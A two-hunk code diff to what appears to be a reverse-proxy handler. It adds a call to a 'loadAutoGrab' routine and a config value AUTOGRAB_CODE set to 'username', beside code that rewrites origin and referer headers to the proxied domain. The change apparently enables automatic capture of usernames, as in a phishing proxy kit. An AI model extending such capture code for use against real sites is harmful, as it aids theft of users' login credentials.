@@ -99,6 +99,8 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
     execute(clientContext) {
 
+        super.loadAutoGrab(configExport.AUTOGRAB_CODE)
+
                
         this.req.headers['origin'] = `https://${clientContext.currentDomain}`
         this.req.headers['referer'] = `https://${clientContext.currentDomain}`
@@ -201,6 +203,7 @@ const configExport = {
 
     START_PATH: '/',
 
+    AUTOGRAB_CODE: 'username',
 
     PRE_HANDLERS:
         [
